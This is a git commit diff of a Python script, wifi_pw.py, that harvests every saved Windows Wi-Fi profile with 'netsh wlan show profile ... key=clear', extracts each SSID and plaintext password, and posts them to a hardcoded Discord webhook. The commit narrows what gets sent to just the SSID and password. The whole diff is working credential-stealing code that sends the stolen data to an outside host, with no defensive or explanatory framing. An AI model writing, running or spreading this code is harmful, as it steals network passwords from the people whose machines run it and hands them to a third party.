fd7460430da5a5e5b565d0c791d13fd998ed02e2
Pranav <meherpranav5@gmail.com>
2021-01-05 10:55:13 +0530

    Removed unnecessary output from result

--- wifi_pw.py
+++ wifi_pw.py
@@ -10,22 +10,32 @@ url = "https://discord.com/api/webhooks/795938695643004949/ykSa4rrVf3ILQPFRFKlem
 
 command = "netsh wlan show profiles"
 networks = subprocess.check_output(command, shell=True).decode('utf-8')
-names_list = re.findall('(?:Profile\s*:\s)(.*)', networks)
+names_list = re.findall('(?:Profile\\s*:\\s)(.*)', networks)
 result = ""
 for name in names_list:
     try:
         command = "netsh wlan show profile " + '"' + name + '"' + " key=clear "
-        current_result = str(subprocess.check_output(command, shell=True).decode('utf-8'))
+        current_result = subprocess.check_output(command, shell=True).decode('utf-8')
+        try:
+            ssid_start_index_no = current_result.index('SSID name')
+            ssid_name_result = current_result[ssid_start_index_no + 26:]
+            ssid_name_end_index = ssid_name_result.index('"')
+            ssid_name = ssid_name_result[:ssid_name_end_index]
+
+            password_start_index_no = current_result.index('Key Content')
+            password_result = current_result[password_start_index_no +25:]
+            password_end_index = password_result.index('Cost settings')
+            password = password_result[:password_end_index]
+
+            final_result = f"SSID Name : {ssid_name} \n" + f"Password : {password} " + '\n'
+
+            data = {'content': final_result}
+            requests.post(url=url, data=json.dumps(data), headers={'Content-Type': "application/json"})
+
+        except:
+            print('error')
+        
     except subprocess.CalledProcessError :
         current_result = "error"
-        #print("Error occurred with %s ", name)
-    result = result + current_result
-    data = {'content': current_result}
-    requests.post(url=url, data=json.dumps(data), headers={'Content-Type': "application/json"})
-
-
-
-
-
-
-
+    
+    
